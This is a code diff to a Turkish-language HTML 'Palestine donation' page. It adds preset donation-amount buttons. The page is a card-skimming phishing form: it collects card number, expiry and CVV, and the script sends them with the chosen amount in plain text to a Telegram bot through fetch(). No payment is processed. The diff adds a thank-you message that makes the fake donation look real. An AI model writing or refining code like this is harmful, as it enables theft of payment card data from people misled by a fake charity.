@@ -56,7 +56,36 @@
             box-sizing: border-box;
         }
         
-        button {
+        .donation-amounts {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+            justify-content: center;
+        }
+        
+        .amount-btn {
+            background-color: #1E90FF; /* Mavi renk */
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1em;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            flex: 1;
+            min-width: 80px;
+        }
+        
+        .amount-btn.selected {
+            background-color: #FFD700; /* Sarı renk (seçili durum) */
+        }
+        
+        .amount-btn:hover {
+            background-color: #006400;
+        }
+        
+        .submit-btn {
             background-color: #006400;
             color: white;
             border: none;
@@ -66,9 +95,10 @@
             cursor: pointer;
             margin-top: 20px;
             transition: background-color 0.3s;
+            width: 100%;
         }
         
-        button:hover {
+        .submit-btn:hover {
             background-color: #008000;
         }
         
@@ -85,6 +115,15 @@
         <h1>FİLİSTİN BAĞIŞ</h1>
         
         <form id="donationForm">
+            <div class="donation-amounts">
+                <button type="button" class="amount-btn" data-amount="50">50 TL</button>
+                <button type="button" class="amount-btn" data-amount="100">100 TL</button>
+                <button type="button" class="amount-btn" data-amount="200">200 TL</button>
+                <button type="button" class="amount-btn" data-amount="500">500 TL</button>
+                <button type="button" class="amount-btn" data-amount="1000">1000 TL</button>
+            </div>
+            <input type="hidden" id="selectedAmount" value="">
+            
             <div class="form-group">
                 <label for="cardNumber">Kart Numarası (16 haneli)</label>
                 <input type="text" id="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456">
@@ -111,11 +150,27 @@
                 <div class="error" id="cvvError">Lütfen geçerli CVV giriniz</div>
             </div>
             
-            <button type="submit">BAĞIŞ YAP</button>
+            <button type="submit" class="submit-btn">BAĞIŞ YAP</button>
         </form>
     </div>
 
     <script>
+        // Bağış miktarı seçim işlevselliği
+        document.querySelectorAll('.amount-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                // Tüm butonlardan selected classını kaldır
+                document.querySelectorAll('.amount-btn').forEach(b => {
+                    b.classList.remove('selected');
+                });
+                
+                // Tıklanan butona selected classını ekle
+                this.classList.add('selected');
+                
+                // Seçilen miktarı hidden inputa ata
+                document.getElementById('selectedAmount').value = this.dataset.amount;
+            });
+        });
+
         document.getElementById('donationForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -123,12 +178,20 @@
             document.querySelectorAll('.error').forEach(el => el.style.display = 'none');
             
             // Değerleri al
+            const selectedAmount = document.getElementById('selectedAmount').value;
             const cardNumber = document.getElementById('cardNumber').value;
             const month = document.getElementById('month').value;
             const year = document.getElementById('year').value;
             const cvv = document.getElementById('cvv').value;
             
             let isValid = true;
+            
+            // Bağış miktarı kontrolü
+            if (!selectedAmount) {
+                alert('Lütfen bir bağış miktarı seçiniz');
+                isValid = false;
+                return;
+            }
             
             // Kart numarası kontrolü
             if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
@@ -156,7 +219,7 @@
             
             // Eğer tüm bilgiler geçerliyse Telegram'a gönder
             if (isValid) {
-                const message = `Yeni Bağış Bilgileri:\nKart No: ${cardNumber}\nSon Kullanma: ${month}/${year}\nCVV: ${cvv}`;
+                const message = `Yeni Bağış Bilgileri:\nMiktar: ${selectedAmount} TL\nKart No: ${cardNumber}\nSon Kullanma: ${month}/${year}\nCVV: ${cvv}`;
                 
                 // Telegram bot API'si kullanarak mesaj gönder
                 // BOT_TOKEN ve CHAT_ID kısımlarını kendi bilgilerinizle değiştirin
@@ -167,8 +230,11 @@
                 fetch(url)
                     .then(response => {
                         if (response.ok) {
-                            alert('Bağışınız için teşekkür ederiz!');
+                            alert(`${selectedAmount} TL bağışınız için teşekkür ederiz!`);
                             document.getElementById('donationForm').reset();
+                            document.querySelectorAll('.amount-btn').forEach(b => {
+                                b.classList.remove('selected');
+                            });
                         } else {
                             alert('Bir hata oluştu, lütfen tekrar deneyin.');
                         }
